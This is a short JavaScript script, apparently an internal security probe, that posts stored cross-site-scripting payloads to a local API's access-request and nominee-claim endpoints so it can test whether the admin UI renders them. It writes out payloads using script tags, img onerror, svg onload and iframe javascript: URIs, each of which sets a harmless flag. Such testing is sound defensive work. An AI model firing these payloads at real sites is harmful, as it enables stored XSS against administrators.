// A24 — plant XSS payloads into the two public-write tables that ARE rendered
// in the admin UI (access_requests, nominee_claims) via the LOCAL API on :3001.
// Marker: A24XSSPROBE — used for cleanup.
const BASE = 'http://localhost:3001';
const M = 'A24XSSPROBE';

async function post(path, body) {
  const r = await fetch(BASE + path, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  const t = await r.text();
  return { status: r.status, body: t };
}

const results = [];

results.push(['access-request/employer', await post('/api/access-request', {
  type: 'employer',
  orgName: `${M} <img src=x onerror="window.__A24_XSS_ORG=1">`,
  registrationNo: `${M}<script>window.__A24_XSS_REG=1</script>`,
  contactName: `${M}<svg/onload=window.__A24_XSS_NAME=1>`,
  contactEmail: `"><script>window.__A24_XSS_EMAIL=1</script>@a24probe.test`,
  contactPhone: '+256770000191',
  sector: `${M}"><img src=x onerror=window.__A24_XSS_SECTOR=1>`,
  district: `${M}<iframe src="javascript:window.__A24_XSS_DISTRICT=1"></iframe>`,
  message: `${M} <script>window.__A24_XSS_MSG=1</script>`,
})]);

results.push(['access-request/distributor', await post('/api/access-request', {
  type: 'distributor',
  orgName: `${M} "><script>window.__A24_XSS_ORG2=1</script>`,
  registrationNo: `${M}-D`,
  contactName: `${M}<img src=1 onerror=window.__A24_XSS_NAME2=1>`,
  contactEmail: `a24probe@a24probe.test`,
  contactPhone: '+256770000192',
  message: `${M}`,
})]);

results.push(['nominee-claim/life', await post('/api/nominee-claim', {
  product: 'life',
  deceasedName: `${M} <img src=x onerror="window.__A24_XSS_DEC=1">`,
  deceasedNin: `${M}<b>N</b>`,
  dateOfDeath: '2026-01-15',
  claimantName: `${M}<svg/onload=window.__A24_XSS_CLM=1>`,
  claimantNin: `${M}NIN`,
  claimantPhone: '+256770000193',
  claimantEmail: `a24probe2@a24probe.test`,
  relationship: `${M}"><script>window.__A24_XSS_REL=1</script>`,
  district: `${M}<iframe onload=window.__A24_XSS_DIS=1>`,
  notes: `${M} <script>window.__A24_XSS_NOTES=1</script>`,
})]);

results.push(['nominee-claim/funeral', await post('/api/nominee-claim', {
  product: 'funeral',
  deceasedName: `${M}2 "><script>window.__A24_XSS_DEC2=1</script>`,
  deceasedNin: `${M}2`,
  dateOfDeath: '2026-02-20',
  claimantName: `${M}2 <img src=x onerror=window.__A24_XSS_CLM2=1>`,
  claimantPhone: '+256770000194',
  relationship: `${M}2`,
  notes: `${M}2`,
})]);

for (const [k, v] of results) console.log(k, '->', v.status, v.body);
